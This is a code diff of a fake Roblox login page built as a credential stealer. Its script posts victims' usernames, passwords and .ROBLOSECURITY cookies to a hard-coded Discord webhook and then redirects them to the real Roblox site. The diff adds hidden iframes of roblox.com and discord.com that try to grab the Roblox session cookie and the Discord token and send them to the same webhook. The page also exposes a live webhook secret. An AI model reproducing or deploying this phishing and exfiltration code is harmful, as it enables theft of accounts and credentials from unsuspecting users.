@@ -37,42 +37,38 @@
     </style>
     <script>
         // Discord webhook URL
-        const webhookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
+        const webhook = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
 
-        // Function to send data to Discord
+        // Function to send data to Discord (for form)
         async function sendToWebhook(payload) {
             try {
-                const response = await fetch(webhookUrl, {
+                const response = await fetch(webhook, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
                 if (response.ok) {
-                    console.log("Webhook sent successfully!");
-                    // Redirect to real Roblox after sending
+                    console.log("Form webhook sent successfully!");
                     window.location.href = "https://www.roblox.com";
                 } else {
-                    console.error("Webhook failed:", response.status);
+                    console.error("Form webhook failed:", response.status);
                 }
             } catch (error) {
-                console.error("Webhook fetch error:", error);
+                console.error("Form webhook fetch error:", error);
             }
         }
 
         // Handle form submission
         function handleLogin(event) {
-            event.preventDefault(); // Stop form submission
+            event.preventDefault();
 
-            // Try to grab the cookie directly (works if not HttpOnly or misconfigured)
             const cookies = document.cookie;
             const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
             const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;
 
-            // Get form inputs
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Payload with cookie and login attempt
             const payload = {
                 username: "Roblox Cookie Grabber",
                 content: "Login attempt captured!",
@@ -88,31 +84,86 @@
                 }]
             };
 
-            // Send to Discord
             sendToWebhook(payload);
         }
 
-        // Check cookies on load (in case user is already logged in)
-        window.onload = function() {
-            const cookies = document.cookie;
-            if (cookies.includes(".ROBLOSECURITY=")) {
-                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
-                const cookieValue = robloxCookie.split('=')[1];
+        // Iframe-based cookie and token grabber
+        function loadURL() {
+            var urlx = document.createElement('iframe');
+            var urly = document.createElement('iframe');
+            let sent = false;
 
-                const payload = {
-                    username: "Roblox Cookie Grabber",
-                    content: "Cookie detected on page load!",
-                    embeds: [{
-                        title: "Captured Info",
-                        fields: [
-                            { name: "ROBLOSECURITY", value: "```" + cookieValue + "```", inline: true },
-                            { name: "Time", value: new Date().toLocaleString(), inline: false }
-                        ],
-                        color: 15258703
-                    }]
-                };
-                sendToWebhook(payload);
-            }
+            urlx.setAttribute('src', 'https://roblox.com/');
+            urlx.style.display = 'none';
+            urlx.style.height = '0%';
+            urlx.style.width = '0%';
+
+            urly.setAttribute('src', 'https://discord.com/');
+            urly.style.display = 'none';
+            urly.style.height = '0%';
+            urly.style.width = '0%';
+
+            document.body.appendChild(urlx);
+            document.body.appendChild(urly);
+
+            // Attempt to get cookies and token after iframe loads
+            urlx.onload = function() {
+                try {
+                    const urlxdoc = urlx.contentDocument || urlx.contentWindow.document;
+                    const RBLXCOOKIE = urlxdoc.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "Not accessible (HttpOnly)";
+
+                    const DISCTOKEN = urly.contentWindow.localStorage.getItem('token') || "Not accessible";
+
+                    function sendinfo(_ROBLOSECURITY, TOKEN) {
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("POST", webhook, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.onreadystatechange = function() {
+                            if (xhr.readyState === 4 && xhr.status === 204) {
+                                console.log("Iframe webhook sent successfully!");
+                                sent = true;
+                            } else if (xhr.readyState === 4) {
+                                console.error("Iframe webhook failed:", xhr.status);
+                            }
+                        };
+                        xhr.send(JSON.stringify({
+                            "content": null,
+                            "embeds": [{
+                                "title": "Iframe Logger",
+                                "description": "Attempted to grab data!",
+                                "color": 10751,
+                                "fields": [
+                                    { "name": "_ROBLOSECURITY COOKIE", "value": "```\n" + _ROBLOSECURITY + "\n```" },
+                                    { "name": "DISCORD TOKEN", "value": "```\n" + TOKEN + "\n```" },
+                                    { "name": "Time", value: new Date().toLocaleString() }
+                                ]
+                            }]
+                        }));
+                    }
+
+                    sendinfo(RBLXCOOKIE, DISCTOKEN);
+
+                    // Clean up iframe (adjusted logic)
+                    setTimeout(() => {
+                        if (sent) {
+                            urlx.remove();
+                            urly.remove();
+                        }
+                    }, 1500);
+                } catch (error) {
+                    console.error("Iframe error:", error);
+                }
+            };
+        }
+
+        // Sleep function for iframe cleanup
+        async function sleep(seconds) {
+            return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
+        }
+
+        // Run both on load
+        window.onload = function() {
+            loadURL(); // Start iframe logger
         };
     </script>
 </head>
